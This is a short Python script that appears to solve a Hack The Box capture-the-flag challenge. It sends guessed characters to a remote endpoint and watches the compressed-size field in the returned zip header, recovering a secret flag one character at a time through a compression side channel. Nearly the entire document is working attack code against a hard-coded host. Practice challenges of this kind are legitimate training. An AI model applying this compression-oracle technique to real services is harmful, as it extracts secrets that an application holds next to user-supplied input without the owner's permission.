import requests

# HOST =  "localhost:1337"
HOST = "209.97.140.29:30041"

# Adding content that already exists on the file won't increase the number of bytes in the compressed archive size
# The compressed archive size is stored on 0x12 of the zip header in 4 bytes
target = "Secret: HTB{"
# target_len = 52 # tested this before when included
target_len = 60 # on remote it's 60

while True:
	for c in range(ord(' '), ord(b'~')):
		res = requests.post(f'http://{HOST}/ingredients', json={"ingredients": target + chr(c)})
		# print(int.from_bytes(res.content[0x12:0x16], 'little'))
		# if the new byte is the correct one it won't affect the file size
		if target_len == int.from_bytes(res.content[0x12:0x16], 'little'):
			target = target + chr(c)
			print(target)
			break
	if target[-1] == '}':
		break

